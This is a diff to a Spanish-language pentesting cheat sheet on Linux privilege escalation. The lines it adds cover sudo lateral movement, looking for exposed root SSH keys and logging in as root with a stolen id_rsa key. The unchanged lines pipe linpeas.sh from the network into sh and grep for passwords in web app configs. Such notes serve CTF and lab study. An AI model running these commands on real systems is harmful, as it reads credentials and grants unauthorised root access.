@@ -91,10 +91,17 @@ stty rows <filas> columns <columnas>                     # stty size en terminal
 
 ```bash
 id; sudo -l                                  # sudo -l SIEMPRE primero
+sudo -u <user> /bin/bash                     # movimiento lateral si sudoers delega a otro usuario
 find / -perm -4000 2>/dev/null               # SUID
 cat /etc/crontab; ls /etc/cron.d/
 grep -ri 'password' /var/www/html/*.php      # creds en config de la app
+ls -la /root/.ssh/ 2>/dev/null               # llaves privadas expuestas por permisos débiles
 curl -L .../linpeas.sh | sh                  # automatizado
+
+# SSH Key Pillaging / Claves privadas:
+chmod 600 id_rsa                             # obligatorio para que ssh acepte la clave
+ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa root@<IP> -p <puerto> # forzar algoritmo legacy en Kali
+ssh -i /root/.ssh/id_rsa root@127.0.0.1      # conexión local si no está expuesto fuera
 ```
 
 GTFOBins: ante cualquier binario en `sudo -l` → `gtfobins.github.io/gtfobins/<bin>#sudo`. Editores (vi/less/man): `:set shell=/bin/sh` + `:shell` desde dentro.
@@ -121,3 +128,4 @@ evil-winrm -i <IP> -u <user> -p <pass>                      # WinRM con creds
 - [[Cheatsheets/Command Basics Tmux|Tmux]]
 - [[Técnicas/2_Enumeración/SNMP_Enumeration|SNMP Enumeration]]
 - [[Técnicas/3_Explotación/Shells-Reverse-Bind-Web|Tipos de Shells y Estabilización]]
+- [[Técnicas/4_PrivEsc/SSH-Key-Pillaging|SSH Key Pillaging & Permissive Permissions]]
